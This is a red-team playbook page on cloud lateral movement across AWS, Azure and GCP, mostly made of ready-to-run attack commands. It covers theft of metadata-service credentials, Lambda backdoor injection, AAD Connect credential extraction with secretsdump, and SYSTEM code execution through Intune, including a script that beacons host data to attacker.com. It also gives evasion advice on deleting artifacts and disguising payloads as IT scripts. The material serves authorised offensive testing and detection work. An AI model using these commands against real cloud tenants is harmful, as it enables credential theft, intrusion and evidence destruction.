# Cloud Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1550 - Use Alternate Authentication Material
> **Platforms**: AWS, Azure, GCP
> **Required Privileges**: Varies (compromised identity, service principal, or instance role)
> **OPSEC Risk**: Medium

## Strategic Overview

Cloud lateral movement fundamentally differs from on-premises techniques. There are no NTLM hashes, no SMB shares, and no service creation. Instead, lateral movement in cloud environments revolves around identity and access management (IAM) -- pivoting between roles, service principals, managed identities, and cross-account trust relationships. The attack surface is defined by permission policies rather than network topology. A compromised IAM role in AWS might allow AssumeRole to cross account boundaries. An Azure Managed Identity on a VM might have Contributor access to other subscriptions. A GCP service account might be able to impersonate other service accounts across projects. The red team lead must think in terms of permission graphs rather than network diagrams. Cloud lateral movement also includes hybrid scenarios -- pivoting from cloud to on-premises (Azure AD Connect) or from on-premises to cloud (stolen cloud credentials on compromised workstations). Detection focuses on anomalous API calls, impossible travel, and unusual cross-account activity.

### Cloud vs On-Premises Lateral Movement

| Aspect              | On-Premises            | Cloud                          |
|---------------------|------------------------|--------------------------------|
| Authentication      | NTLM, Kerberos         | OAuth, SAML, API Keys, STS     |
| Pivoting mechanism  | Protocols (SMB, RDP)   | IAM roles, policies, trust     |
| Network boundaries  | Subnets, VLANs         | VPCs, security groups, service endpoints |
| Credential type     | Hashes, tickets        | Access keys, tokens, certificates |
| Detection focus     | Network + endpoint     | CloudTrail, activity logs      |

## Technical Deep-Dive

### AWS Lateral Movement

#### Cross-Account Role Assumption

```bash
# Enumerate roles the current identity can assume
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS]]'

# Assume a role in the same or different account
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name lateral

# Extract temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify new identity
aws sts get-caller-identity

# Enumerate what the assumed role can access
# Use enumerate-iam or pacu for comprehensive permission enumeration
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN
```

#### EC2 Instance Metadata and SSM

```bash
# From a compromised EC2 instance, steal the instance role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# SSM Session Manager -- lateral movement to other EC2 instances
aws ssm start-session --target i-0123456789abcdef0

# SSM Run Command -- execute commands on multiple instances
aws ssm send-command --instance-ids "i-0123456789abcdef0" --document-name "AWS-RunShellScript" --parameters 'commands=["whoami","id"]'

# EC2 Instance Connect -- push temporary SSH key
aws ec2-instance-connect send-ssh-public-key --instance-id i-0123456789abcdef0 --instance-os-user ec2-user --ssh-public-key file://my_key.pub
ssh -i my_key ec2-user@instance_ip
```

#### Lambda and S3 Pivoting

```bash
# Invoke Lambda functions (may have different IAM roles and network access)
aws lambda invoke --function-name AdminFunction --payload '{"command":"id"}' output.json

# List and modify Lambda function code (inject backdoor)
aws lambda get-function --function-name TargetFunction --query 'Code.Location'
aws lambda update-function-code --function-name TargetFunction --zip-file fileb://backdoor.zip

# S3 bucket access from compromised identity
aws s3 ls
aws s3 cp s3://sensitive-bucket/credentials.txt ./
aws s3 sync s3://backup-bucket/ ./backup/

# Check for cross-account S3 bucket policies
aws s3api get-bucket-policy --bucket target-bucket
```

### Azure Lateral Movement

#### Service Principal and Managed Identity Pivoting

```bash
# From a compromised VM with Managed Identity, get an access token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use the token with Azure CLI
az login --identity
az account list
az account set --subscription "Target Subscription"

# Enumerate accessible resources with the current identity
az resource list
az vm list --query '[].{Name:name, ResourceGroup:resourceGroup}'

# Service Principal credential theft from app registrations
az ad app list --query '[].{DisplayName:displayName, AppId:appId}'
az ad app credential list --id APP_ID
az ad app credential reset --id APP_ID  # Generate new credential (destructive but effective)
```

#### Azure AD to On-Premises Pivoting

```powershell
# Azure AD Connect -- if compromised, can extract on-premises credentials
# AAD Connect stores credentials for the sync account (often Domain Admin equivalent)
# Located on the Azure AD Connect server

# Extract AAD Connect credentials with AADInternals
Import-Module AADInternals
Get-AADIntSyncCredentials

# The sync account (MSOL_xxxxx) typically has DCSync-equivalent permissions
# Use extracted credentials for on-premises domain compromise
secretsdump.py 'corp.local/MSOL_account:password@dc01.corp.local'
```

#### Automation Account and Runbook Execution

```bash
# List Automation Accounts
az automation account list

# List Runbooks in an Automation Account
az automation runbook list --automation-account-name "AutoAccount" --resource-group "RG"

# Create or modify a Runbook for code execution
az automation runbook create --automation-account-name "AutoAccount" --resource-group "RG" --name "LateralMove" --type PowerShell

# Publish and start the Runbook
az automation runbook publish --automation-account-name "AutoAccount" --resource-group "RG" --name "LateralMove"
az automation runbook start --automation-account-name "AutoAccount" --resource-group "RG" --name "LateralMove"

# Runbooks execute with the Automation Account's Run As account
# which often has Contributor-level access across subscriptions
```

#### Intune-Based Lateral Movement

```powershell
# Intune provides multiple code execution mechanisms on managed devices
# Required roles: Global Admin, Intune Admin, or Cloud Device Administrator

# --- Method 1: PowerShell Script Deployment ---
# Push scripts to specific devices or groups
$scriptContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami > C:\temp\intune_exec.txt'))

$body = @{
    displayName = "ComplianceCheck"
    scriptContent = $scriptContent
    runAsAccount = "system"
    enforceSignatureCheck = $false
    runAs32Bit = $false
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" `
  -Method POST -Headers $headers -Body $body -ContentType "application/json"

# Assign script to a specific device group
$assignBody = @{
    deviceManagementScriptAssignments = @(@{
        target = @{
            "@odata.type" = "#microsoft.graph.groupAssignmentTarget"
            groupId = "TARGET_GROUP_ID"
        }
    })
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/SCRIPT_ID/assign" `
  -Method POST -Headers $headers -Body $assignBody -ContentType "application/json"

# --- Method 2: Win32 App Deployment ---
# Deploy a .intunewin package (can contain arbitrary executables)
# Use the IntuneWinAppUtil.exe to package a payload
# Upload via Graph API and assign to target devices
# Apps run with SYSTEM privileges during installation

# --- Method 3: Compliance Policy Abuse ---
# Custom compliance scripts run on devices to check compliance
# A malicious compliance script executes code on every check-in cycle
# Scripts run as SYSTEM and execute repeatedly (every 8 hours by default)
$complianceScript = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(@'
$result = @{ "compliance": $true }
# Payload executes here with SYSTEM privileges on every compliance check
Invoke-WebRequest -Uri "https://attacker.com/beacon" -Method POST -Body (hostname)
$result | ConvertTo-Json -Compress
'@))

# --- Method 4: Remediation Scripts ---
# Proactive remediation scripts detect and fix "issues"
# Detection script runs first; if it reports non-compliant, remediation runs
# Both execute as SYSTEM and can contain arbitrary code
# Remediation scripts are particularly stealthy -- they blend with IT operations

# --- Method 5: Configuration Profile Abuse ---
# Custom OMA-URI settings can execute PowerShell via:
# ./Device/Vendor/MSFT/Policy/Config/Scripts/ScheduleScript
# Or deploy custom CSP policies that trigger code execution
```

```
# Intune lateral movement OPSEC considerations:
# - Script deployment logs appear in Intune Device Diagnostics
# - Win32 app installations logged in Event Viewer (Application log)
# - Compliance scripts generate compliance state change events
# - All methods require Intune management agent check-in (default: every 8 hours)
#   Force immediate check-in: Invoke-RestMethod -Uri ".../managedDevices/DEVICE_ID/syncDevice" -Method POST
# - Blend with existing Intune operations (name scripts like real IT scripts)
# - Assign to small groups, not "All Devices" to reduce visibility
# - Delete scripts/policies after execution to minimize forensic artifacts
```

### GCP Lateral Movement

#### Service Account Impersonation

```bash
# List service accounts in the project
gcloud iam service-accounts list

# Check if current identity can impersonate other service accounts
gcloud iam service-accounts get-iam-policy SA_EMAIL

# Impersonate a service account
gcloud auth print-access-token --impersonate-service-account=target-sa@project.iam.gserviceaccount.com

# Generate a key for the service account (persistent access)
gcloud iam service-accounts keys create key.json --iam-account=target-sa@project.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file=key.json

# Use impersonated identity to access resources
gcloud compute instances list --impersonate-service-account=target-sa@project.iam.gserviceaccount.com
```

#### Compute Engine to Other Services

```bash
# From a compromised GCE instance, access the metadata server
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Access other GCP services using the instance's service account
gcloud compute instances list
gcloud storage ls
gcloud sql instances list

# SSH to other instances (if IAM allows)
gcloud compute ssh other-instance --zone us-central1-a

# Execute commands on other instances via OS Login
gcloud compute ssh other-instance --command "whoami"

# Serial console access
gcloud compute connect-to-serial-port other-instance
```

#### Cross-Project Lateral Movement

```bash
# List projects the current identity has access to
gcloud projects list

# Switch project context
gcloud config set project target-project-id

# Enumerate resources in the target project
gcloud compute instances list --project target-project-id
gcloud storage ls --project target-project-id

# Cloud Functions abuse (execute in different project context)
gcloud functions list --project target-project-id
gcloud functions call function-name --project target-project-id --data '{"cmd":"id"}'
```

## Detection & Evasion

### Detection Indicators

- **AWS CloudTrail**: AssumeRole events from unexpected sources, SSM session initiation, unusual API calls
- **Azure Activity Log**: Service principal authentication anomalies, Runbook executions, Managed Identity token requests
- **GCP Cloud Audit Logs**: Service account impersonation, cross-project access, metadata server queries from unusual processes
- Impossible travel patterns in cloud identity authentication logs
- Access token usage from IP addresses outside normal ranges
- Bulk resource enumeration API calls (list operations across many services)

### Evasion Techniques

- Use assumed roles with short session durations to limit token exposure window
- Perform API calls from expected IP ranges (VPC endpoints, corporate egress IPs)
- Avoid bulk enumeration -- target specific resources rather than listing everything
- Use existing automation patterns (match Runbook schedules, Lambda invocation patterns)
- Leverage cloud-native tools (SSM, Cloud Shell) rather than external API calls
- Time lateral movement during business hours when cloud admin activity is expected
- Use service account credentials from the services they are associated with (expected behavior)

## 2025 Techniques

### Cross-Cloud Lateral Movement via GitHub PATs

- Complete attack chain from GitHub PAT compromise to CSP control plane access
- Attackers scrape plain-text secrets, bypass GitHub's masking to retrieve Action secrets, or create new cloud keys
- From there, transition from source code compromise to full cloud incident
- 45% of organizations have plain-text cloud keys stored in private repos
- Source: Wiz Research (2025)
- MITRE: T1078.004, T1552.001

### Container-Based Cross-Cloud Lateral Movement

- 34% increase in container-based lateral movement attacks in 2025 (Illumio 2025 Report)
- Lateral movement affects nearly 90% of organizations
- Academic research (IEEE, 2025) proposed a Lateral Movement Detection (LMD) system for cross-cloud containerized environments
- Attackers adapted to cloud-native architectures, using container escapes as a primary lateral movement mechanism
- MITRE: T1021, T1550, T1611

### Cross-Provider Attack Path Analysis

- Orca Security analysis of 8+ million attack paths found that 9% of organizations have at least one cross-cloud provider attack path
- 31% have at least one cross-account attack path
- Security teams lack unified observability across clouds, with logs and telemetry fragmented
- Source: Orca Security (2025)
- MITRE: T1078.004

### Pass-the-PRT (Primary Refresh Token) for Cloud Lateral Movement

- Pass-the-PRT attack enables lateral movement from on-premises to cloud
- Steal Primary Refresh Tokens from Azure AD joined/hybrid joined devices
- Use stolen PRTs to authenticate to cloud services
- Key hybrid lateral movement technique bridging on-prem and cloud identity
- Source: RBT Security (2025)
- MITRE: T1550.001

### Cloud Logging Evasion via Infrastructure Modification (T1578)

- Adversaries abuse legitimate cloud features for evasion (Permiso Research, 2025):
  - T1578.001 Create Snapshots: access snapshots of restricted data bypassing access controls
  - T1578.002 Create Cloud Instance: spin up new instances to evade per-instance monitoring
  - T1578.003 Delete Cloud Instance: delete instances after malicious activity to destroy evidence
  - T1578.004 Revert Cloud Instance: rollback instances to pre-attack state to hide modifications
- All techniques available across AWS, Azure, and GCP
- MITRE: T1578 and sub-techniques

### Multi-Cloud Log Fragmentation

- AWS, Azure, and GCP have different security tools, log formats, and APIs
- Logs are scattered, alerts don't align, and response actions aren't always compatible
- In GCP, threats exploit gaps between projects or folders
- Normalizing telemetry requires aggregating into a single SIEM/SOAR
- Structural detection gap that benefits red teams crossing cloud boundaries
- Source: Multiple sources (2025)
- MITRE: T1562.008

### Unlogged GitHub API Search for Secret Discovery

- GitHub API code search calls used to discover secret names are NOT logged
- A threat actor with basic read permissions via a PAT can discover secret names in workflow YAML
- Combined with write permissions, attackers can delete workflow logs, runs, PRs, and branches for evidence destruction
- Most organizations have no visibility into this reconnaissance
- Source: Wiz Research (2025)
- MITRE: T1552.001, T1562

### Novel Cloud Threat Actor Detection Techniques (Unit42)

- Palo Alto Unit42 research on tracking threat groups through cloud logging
- Identifying novel detection techniques for adversary operations in cloud environments
- Understanding how defenders detect operations is critical for red team evasion planning
- Source: Palo Alto Unit42 (2025)

## Cross-References

- [[ssh-lateral]] - SSH into cloud instances as a traditional lateral movement method
- [Azure Enumeration](../13-cloud-security/azure/azure-enumeration.md) -- Pre-lateral enumeration of Azure resources, identities, and permissions
- [Azure Defenses & Bypass](../13-cloud-security/azure/azure-defenses-bypass.md) -- Network security bypass, CA evasion for lateral movement
- Section 06: Credential Access - Cloud credential harvesting (metadata, environment variables)
- Section 10: Domain Escalation - Azure AD privilege escalation paths
- Section 04: Discovery - Cloud infrastructure enumeration
- Section 07: Persistence - Cloud-native persistence mechanisms (Lambda, Automation, IAM)

## References

- https://attack.mitre.org/techniques/T1550/
- https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/
- https://github.com/NetSPI/MicroBurst (Azure)
- https://github.com/Gerenios/AADInternals
- https://cloud.google.com/iam/docs/service-account-impersonation
- https://hackingthe.cloud/
